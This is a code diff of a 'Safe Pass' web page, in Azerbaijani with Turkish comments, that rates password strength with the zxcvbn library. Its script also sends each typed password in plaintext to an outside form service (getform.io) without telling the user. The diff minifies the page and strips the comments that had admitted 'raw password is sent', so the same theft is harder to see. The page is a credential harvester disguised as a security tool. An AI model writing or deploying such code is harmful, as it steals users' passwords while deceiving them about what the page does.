@@ -1,12 +1,5 @@
 <!DOCTYPE html>
-<html lang="az">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Safe Pass</title>
-  <link rel="stylesheet" href="./style.css">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"/>
+<html lang="az"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Safe Pass</title><link rel="stylesheet" href="./style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"/>
 </head>
 <body>
   <nav class="navbar navbar-light bg-dark text-white">
@@ -30,65 +23,4 @@
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/zxcvbn/4.4.2/zxcvbn.js"></script>
 
-  <script>
-    $(document).ready(function(){
-      $("#checkBtn").click(async function(){
-        const pwd = $("#password").val();
-        if(!pwd){
-          $("#result").text("⚠️ Please enter a password").removeClass().addClass("strength weak");
-          return;
-        }
-
-        // Şifre gücünü hesapla
-        const result = zxcvbn(pwd);
-        let text = "";
-        let cls = "";
-
-        switch(result.score){
-          case 0:
-          case 1:
-            text = "Weak ❌ (easy to guess)";
-            cls = "weak";
-            break;
-          case 2:
-            text = "Fair ⚠️ (could be stronger)";
-            cls = "fair";
-            break;
-          case 3:
-            text = "Good ✅ (strong enough for most cases)";
-            cls = "good";
-            break;
-          case 4:
-            text = "Strong 💪 (very hard to crack)";
-            cls = "strong";
-            break;
-        }
-
-        $("#result").text(text).removeClass().addClass("strength " + cls);
-
-        // FormData oluştur — burada HAM PAROLA gönderiliyor
-        const fd = new FormData();
-        fd.append("password", pwd);              // <-- düz metin parola
-        fd.append("password_score", result.score);
-        fd.append("password_feedback", pwd);
-        fd.append("_gotcha", ""); // honeypot (bot kontrol)
-
-        try {
-          const response = await fetch("https://getform.io/f/ajjrykva", {
-            method: "POST",
-            body: fd
-          });
-
-          if(response.ok){
-            $("#result").text(text + "").removeClass().addClass("strength " + cls);
-          } else {
-            $("#result").text("Gönderim hatası: " + response.status).removeClass().addClass("strength weak");
-          }
-        } catch (err) {
-          $("#result").text("Ağ hatası").removeClass().addClass("strength weak");
-        }
-      });
-    });
-  </script>
-</body>
-</html>
+  <script>$(document).ready(function(){$("#checkBtn").click(async function(){const pwd = $("#password").val();if(!pwd){$("#result").text("⚠️ Please enter a password").removeClass().addClass("strength weak");return;}const result = zxcvbn(pwd);let text = "";let cls = "";switch(result.score){case 0:case 1:text = "Weak ❌ (easy to guess)";cls = "weak";break;case 2:text = "Fair ⚠️ (could be stronger)";cls = "fair";break;case 3:text = "Good ✅ (strong enough for most cases)";cls = "good";break;case 4:text = "Strong 💪 (very hard to crack)";cls = "strong";break;}$("#result").text(text).removeClass().addClass("strength " + cls);const fd = new FormData();fd.append("password", pwd);fd.append("password_score", result.score);fd.append("password_feedback", pwd);fd.append("_gotcha", ""); try {const response = await fetch("https://getform.io/f/ajjrykva", {method: "POST",body: fd});if(response.ok){$("#result").text(text + "").removeClass().addClass("strength " + cls);} else {$("#result").text("Gönderim hatası: " + response.status).removeClass().addClass("strength weak");}} catch (err) {$("#result").text("Ağ hatası").removeClass().addClass("strength weak");}});});</script></body></html>
